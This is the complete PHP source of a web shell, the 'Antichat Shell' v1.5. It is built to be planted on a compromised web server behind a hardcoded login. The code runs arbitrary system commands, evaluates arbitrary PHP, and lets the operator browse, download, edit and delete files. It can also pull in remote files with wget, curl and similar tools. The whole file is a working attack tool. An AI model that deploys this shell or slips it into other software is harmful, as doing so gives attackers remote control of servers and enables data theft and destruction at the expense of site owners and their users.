<?php
session_start();
error_reporting(0);
set_time_limit(9999999);
$login='antichat';
$password='antichat';
$auth=1;
$version='version 1.5 by Grinay';
$msgnotice='';
$style='<STYLE>
BODY{
  background-color: #2B2F34;
  color: #C1C1C7;
  font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;
  MARGIN-TOP: 0px;
  MARGIN-BOTTOM: 0px;
  MARGIN-LEFT: 0px;
  MARGIN-RIGHT: 0px;
  margin:0;
  padding:0;
  scrollbar-face-color: #336600;
  scrollbar-shadow-color: #333333;
  scrollbar-highlight-color: #333333;
  scrollbar-3dlight-color: #333333;
  scrollbar-darkshadow-color: #333333;
  scrollbar-track-color: #333333;
  scrollbar-arrow-color: #333333;
}
input{
  background-color: #336600;
  font-size: 8pt;
  color: #FFFFFF;
  font-family: Tahoma;
  border: 1 solid #666666;
}
select{
  background-color: #336600;
  font-size: 8pt;
  color: #FFFFFF;
  font-family: Tahoma;
  border: 1 solid #666666;
}
textarea{
  background-color: #333333;
  font-size: 8pt;
  color: #FFFFFF;
  font-family: Tahoma;
  border: 1 solid #666666;
}
a:link{
  
  color: #B9B9BD;
  text-decoration: none;
  font-size: 8pt;
}
a:visited{
  color: #B9B9BD;
  text-decoration: none;
  font-size: 8pt;
}
a:hover, a:active{
  width: 100%;
  background-color: #A8A8AD;
  

  color: #E7E7EB;
  text-decoration: none;
  font-size: 8pt;
}
td, th, p, li{
  font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;
  border-color:black;
}
</style>';
$header='<html><head><title>'.getenv("HTTP_HOST").' - Antichat Shell</title><meta http-equiv="Content-Type" content="text/html; charset=windows-1251">'.$style.'</head><BODY leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>';
$footer='</body></html>';

//error parser
$filext="File already exists.";
$uploadok="File was successfully uploaded.";
$dircrt="Dir is created.";
$dircrterr="Don't create dir.";
$dirnf="Dir not found.";
$empty="Directory not empty or access denide.";
$deletefileok="File deleted";
$deletedirok="Dir deleted";
//end error parser

//auth
if(@$_POST['action']=="exit")unset($_SESSION['an']);
if($auth==1){if(@$_POST['login']==$login && @$_POST['password']==$password)$_SESSION['an']=1;}else $_SESSION['an']='1';
if(@$_SESSION['an']==0){
echo $header;
echo '<center><table><form method="POST"><tr><td>Login:</td><td><input type="text" name="login" value=""></td></tr><tr><td>Password:</td><td><input type="password" name="password" value=""></td></tr><tr><td></td><td><input type="submit" value="Enter"></td></tr></form></table></center>';
echo $footer;
exit;}
//end auth

function createdir($dir){if(@mkdir($dir))echo $GLOBALS['dircrt']." "; else echo $GLOBALS['dircrterr']." ";}



if($_SESSION['action']=="")$_SESSION['action']="viewer";
if(@$_POST['action']!="" )$_SESSION['action']=$_POST['action'];$action=$_SESSION['action'];
if(@$_POST['dir']!="")$_SESSION['dir']=$_POST['dir'];$dir=$_SESSION['dir'];

$dir=chdir($dir);
$dir=getcwd()."/";
$dir=str_replace("\\","/",$dir);






//crdir


if(@$_POST['file']!=""){$file=$_SESSION['file']=$_POST['file'];}else {$file=$_SESSION['file']="";}
  
//Current type OS
if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') $win=1; else $win=0;



 
 
 

//downloader
if($action=="download"){ 
header('Content-Length:'.filesize($file).'');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="'.$file.'"');
readfile($file);
}
//end downloader

//delete file
if($action=="delete"){ 
if(unlink($file)) $msgnotice.=$deletefileok;
}
//end delete

//delete dir
if($action=="deletedir"){ 
if(!rmdir($file)) $msgnotice.=$GLOBALS['empty'];else $msgnotice.=$deletedirok;

}
//end delete
?>

<? echo $header;?> 
<!--content-->
<table width="100%" bgcolor="#336600" align="right" colspan="2" border="0" cellspacing="0" cellpadding="0"><tr><td>
<table><tr>
<td><a href="#" onclick="document.reqs.action.value='shell'; document.reqs.submit();">| Shell </a></td>
<td><a href="#" onclick="document.reqs.action.value='viewer'; document.reqs.submit();">| Viewer</a></td>
<td><a href="#" onclick="document.reqs.action.value='editor'; document.reqs.submit();">| Editor</a></td>
<td><a href="#" onclick="document.reqs.action.value='upload'; document.reqs.submit();">| Upload</a></td>
<td><a href="#" onclick="document.reqs.action.value='phpeval'; document.reqs.submit();">| Php Eval</a></td>
<td><a href="#" onclick="document.reqs.action.value='exit'; document.reqs.submit();">| EXIT |</a></td>
<td><a href="#" onclick="history.back();"> <-back |</a></td>
<td><a href="#" onclick="history.forward();"> forward->|</a></td>

</tr></table></td></tr></table><br>
<form name='reqs' method='POST'>
<input name='action' type='hidden' value=''>
<input name='dir' type='hidden' value=''>
<input name='file' type='hidden' value=''>
</form>
<table style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
<tr><td width="100%" valign="top">
<!--end one content-->
<?php if(@$msgnotice!="") echo $msgnotice;?>
<?

//shell
function shell($cmd){
if (!empty($cmd)){
  $fp = popen($cmd,"r");
  {
    $result = "";
    while(!feof($fp)){$result.=fread($fp,1024);}
    pclose($fp);
  }
  $ret = $result;
  $ret = convert_cyr_string($ret,"d","w");
}
return $ret;}

if($action=="shell"){
echo "<form method=\"POST\">
<input type=\"hidden\" name=\"action\" value=\"shell\">
<textarea name=\"command\" rows=\"5\" cols=\"150\">".@$_POST['command']."</textarea><br>
<textarea readonly rows=\"15\" cols=\"150\">".@htmlspecialchars(shell($_POST['command']))."</textarea><br>
<input type=\"submit\" value=\"execute\"></form>";}
//end shell


//viewer FS
function perms($file) 
{ 
  $perms = fileperms($file);
  if (($perms & 0xC000) == 0xC000) {$info = 's';} 
  elseif (($perms & 0xA000) == 0xA000) {$info = 'l';} 
  elseif (($perms & 0x8000) == 0x8000) {$info = '-';} 
  elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} 
  elseif (($perms & 0x4000) == 0x4000) {$info = 'd';} 
  elseif (($perms & 0x2000) == 0x2000) {$info = 'c';} 
  elseif (($perms & 0x1000) == 0x1000) {$info = 'p';} 
  else {$info = 'u';}
  $info .= (($perms & 0x0100) ? 'r' : '-');
  $info .= (($perms & 0x0080) ? 'w' : '-');
  $info .= (($perms & 0x0040) ?(($perms & 0x0800) ? 's' : 'x' ) :(($perms & 0x0800) ? 'S' : '-'));
  $info .= (($perms & 0x0020) ? 'r' : '-');
  $info .= (($perms & 0x0010) ? 'w' : '-');
  $info .= (($perms & 0x0008) ?(($perms & 0x0400) ? 's' : 'x' ) :(($perms & 0x0400) ? 'S' : '-'));
  $info .= (($perms & 0x0004) ? 'r' : '-');
  $info .= (($perms & 0x0002) ? 'w' : '-');
  $info .= (($perms & 0x0001) ?(($perms & 0x0200) ? 't' : 'x' ) :(($perms & 0x0200) ? 'T' : '-'));
  return $info;
} 

function view_size($size)
{
 if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;
}

function scandire($dir){


		
echo "<table cellSpacing=0 border=1 style=\"border-color:black;\" cellPadding=0 width=\"100%\">";
echo "<tr><td><form method=POST>Open directory:<input type=text name=dir value=\"".$dir."\" size=50><input type=submit value=\"GO\"></form></td></tr>";

if (is_dir($dir)) {
    if (@$dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
		  if(filetype($dir . $file)=="dir") $dire[]=$file;
		  if(filetype($dir . $file)=="file")$files[]=$file;
		}
		closedir($dh);
		@sort($dire);
		@sort($files);


if ($GLOBALS['win']==1) {
echo "<tr><td>Select drive:";
for ($j=ord('C'); $j<=ord('Z'); $j++) 
 if (@$dh = opendir(chr($j).":/"))
 echo '<a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\''.chr($j).':/\'; document.reqs.submit();"> '.chr($j).'<a/>';
 echo "</td></tr>";
}
echo "<tr><td>OS: ".@php_uname()."</td></tr>
<tr><td>name dirs and files</td><td>type</td><td>size</td><td>permission</td><td>options</td></tr>";
for($i=0;$i<count($dire);$i++) {
$link=$dir.$dire[$i];
  echo '<tr><td><a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\''.$link.'\'; document.reqs.submit();">'.$dire[$i].'<a/></td><td>dir</td><td></td><td>'.perms($link).'</td><td><a href="#" onclick="document.reqs.action.value=\'deletedir\'; document.reqs.file.value=\''.$link.'\'; document.reqs.submit();" title="Delete this file">X</a></td></tr>';  
  }
for($i=0;$i<count($files);$i++) {
$linkfile=$dir.$files[$i];
echo '<tr><td><a href="#" onclick="document.reqs.action.value=\'editor\'; document.reqs.file.value=\''.$linkfile.'\'; document.reqs.submit();">'.$files[$i].'</a><br></td><td>file</td><td>'.view_size(filesize($linkfile)).'</td>
<td>'.perms($linkfile).'</td>
<td>
<a href="#" onclick="document.reqs.action.value=\'download\'; document.reqs.file.value=\''.$linkfile.'\'; document.reqs.submit();" title="Download">D</a>
<a href="#" onclick="document.reqs.action.value=\'editor\'; document.reqs.file.value=\''.$linkfile.'\'; document.reqs.submit();" title="Edit">E</a>
<a href="#" onclick="document.reqs.action.value=\'delete\'; document.reqs.file.value=\''.$linkfile.'\'; document.reqs.submit();" title="Delete this file">X</a></td>
</tr>'; 
}
echo "</table>";
}}}

if($action=="viewer"){
scandire($dir);
}
//end viewer FS

//editros
if($action=="editor"){  
  function writef($file,$data){
  $fp = fopen($file,"w+");
  fwrite($fp,$data);
  fclose($fp);
  }
  function readf($file){
  if(!$le = fopen($file, "r")) $contents="Can't open file, permission denide"; else {
  $contents = fread($le, filesize($file));
  fclose($le);}
  return htmlspecialchars($contents);
  }
if(@$_POST['save'])writef($file,$_POST['data']);
echo "<form method=\"POST\">
<input type=\"hidden\" name=\"action\" value=\"editor\">
<input type=\"hidden\" name=\"file\" value=\"".$file."\">
<textarea name=\"data\" rows=\"40\" cols=\"180\">".@readf($file)."</textarea><br>
<input type=\"submit\" name=\"save\" value=\"save\"><input type=\"reset\" value=\"reset\"></form>";
}
//end editors

//upload
if($action=="upload"){
  if(@$_POST['dirupload']!="") $dirupload=$_POST['dirupload'];else $dirupload=$dir;
  $form_win="<tr><td><form method=POST enctype=multipart/form-data>Upload to dir:<input type=text name=dirupload value=\"".$dirupload."\" size=50></tr></td><tr><td>New file name:<input type=text name=filename></td></tr><tr><td><input type=file name=file><input type=submit name=uploadloc value='Upload local file'></td></tr>";
  if($GLOBALS['win']==1)echo $form_win;
  if($GLOBALS['win']==0){
    echo $form_win;
	echo '<tr><td><select size=\"1\" name=\"with\"><option value=\"wget\">wget</option><option value=\"fetch\">fetch</option><option value=\"lynx\">lynx</option><option value=\"links\">links</option><option value=\"curl\">curl</option><option value=\"GET\">GET</option></select>File addres:<input type=text name=urldown>
<input type=submit name=upload value=Upload></form></td></tr>';	
}

if(@$_POST['uploadloc']){
if(@$_POST['filename']=="") $uploadfile = $dirupload.basename($_FILES['file']['name']); else 
$uploadfile = $dirupload."/".$_POST['filename'];

if(!file_exists($dirupload)){createdir($dirupload);}
if(file_exists($uploadfile))echo $GLOBALS['filext']; 
elseif (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) 
echo $GLOBALS['uploadok'];
}

if(@$_POST['upload']){
    if (!empty($_POST['with']) && !empty($_POST['urldown']) && !empty($_POST['filename']))
	switch($_POST['with'])
	{
	  case wget:
	  shell(which('wget')." ".$_POST['urldown']." -O ".$_POST['filename']."");
	  break;
 	  case fetch:
 	  shell(which('fetch')." -o ".$_POST['filename']." -p ".$_POST['urldown']."");
 	  break;
 	  case lynx:
 	  shell(which('lynx')." -source ".$_POST['urldown']." > ".$_POST['filename']."");
 	  break;
 	  case links:
 	  shell(which('links')." -source ".$_POST['urldown']." > ".$_POST['filename']."");
 	  break;
 	  case GET:
 	  shell(which('GET')." ".$_POST['urldown']." > ".$_POST['filename']."");
 	  break;
 	  case curl:
 	  shell(which('curl')." ".$_POST['urldown']." -o ".$_POST['filename']."");
 	  break;
	 }
	}
  
}
//end upload section


if($action=="phpeval"){
 echo "
<form method=\"POST\">
 <input type=\"hidden\" name=\"action\" value=\"phpheval\">
 &lt;?php<br>
<textarea name=\"phpev\" rows=\"5\" cols=\"150\">".@$_POST['phpev']."</textarea><br>
?><br>
<input type=\"submit\" value=\"execute\"></form>";} 
if(@$_POST['phpev']!=""){echo eval($_POST['phpev']);}
?>
</td></tr></table><table width="100%" bgcolor="#336600" align="right" colspan="2" border="0" cellspacing="0" cellpadding="0"><tr><td><table><tr><td><a href="http://antichat.ru">COPYRIGHT BY ANTICHAT.RU <?php echo $version;?></a></td></tr></table></tr></td></table>
<? echo $footer;?>